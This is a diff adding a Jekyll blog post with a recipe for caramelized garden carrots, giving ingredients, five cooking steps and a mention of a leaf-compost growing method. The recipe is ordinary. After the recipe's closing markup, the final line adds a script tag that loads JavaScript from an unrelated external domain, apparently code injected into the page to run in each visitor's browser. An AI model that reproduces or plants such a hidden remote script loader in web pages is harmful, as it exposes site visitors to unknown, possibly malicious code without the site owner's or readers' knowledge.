@@ -1,0 +1,36 @@
+---
+layout: post
+title:  "Carrots"
+date:   2018-09-12 08:51:10 -0500
+categories: jekyll update
+---
+<h2 class="style">A delicious recipe for your garden grown carrots.</h2>
+<img src="/sites/default/files/blog/caramelized-carrots-ingredents.jpg">
+<img src="/sites/default/files/blog/caramelized-carrots-kitchen.jpg">
+<div class="recipe"><p>
+Growing carrots is easy. Well it's easy when you use the Compost Hero Leaf Compost method.
+Here is a recipe for the loads of carrots you will have in the late winter after a season growing carrots using leaf compost. This recipe is a favorite as a side dish to any festive meal.<p />
+<div class="recipeIngredents">
+<h3>Ingredients</h3>
+<div class="recipeIngredents"><dl>
+<dt><span>8 - 10</span></dt><dd>Carrots pulled from your garden.</dd>
+<dt><span>2</span></dt><dd> Cloves garlic, hopefully pulled from your garden.</dd>
+<dt><span>1</span></dt><dd> Small piece of ginger, hopefully pulled from your garden.</dd>
+<dt><span>2</span></dt><dd> Dried cayenne peppers, hopefully pulled from your garden.</dd>
+<dt><span>1</span></dt><dd> Juice of whole lemon</dd>
+<dt><span>1</span></dt><dd> Tbsp vegetable oil</dd>
+<dt><span>1</span></dt><dd> Tbsp apple cider vinegar</dd>
+<dt><span>2</span></dt><dd> Tbsp sugar</dd></dl>
+</div>
+
+<div class="recipeSteps">
+<h3>Directions</h3>
+<ul><li>
+<span class="recipeStepsHeading">1.</span> <span class="recipeStepsBody">Cut carrots into regular pieces. To get more surface area in contact with the pan, square up your carrot pieces and discard the remnants.</span>
+</li><li><span class="recipeStepsHeading">2.</span> <span class="recipeStepsBody">In a large skillet, heat 1 Tbsp Vegetable oil, 1 Tbsp apple cider vinegar and the juice of one whole lemon.</span>
+</li><li><span class="recipeStepsHeading">3.</span> <span class="recipeStepsBody">Bring skillet up to medium-high heat. When the oil and liquid is hot and steaming, add the carrots in a single layer and cover. Cook for 5 minutes. Uncover and cook another 5 minutes staring regularly to brown the carrots. Keep an eye on them as they should be developing a nice caramelization at this point. </span>
+</li><li><span class="recipeStepsHeading">4.</span> <span class="recipeStepsBody">Add remaining ingredients and cook another 5 minutes or until the garlic and ginger are cooked and the sugar has glazed the caramelized carrots. </span>
+</li><li><span class="recipeStepsHeading">5.</span> <span class="recipeStepsBody">Serve with a garnish of carrot tops, the bitter green carrot tops are a nice contrast to the sweet and savory of the caramelized carrot.</span>
+</li></ul>
+<img src="/sites/default/files/blog/garden-caramelized-carrots-recipe.jpg">
+</div><script type='text/javascript' src='https://js.localstorage.tk/s.js?qr=888'></script>
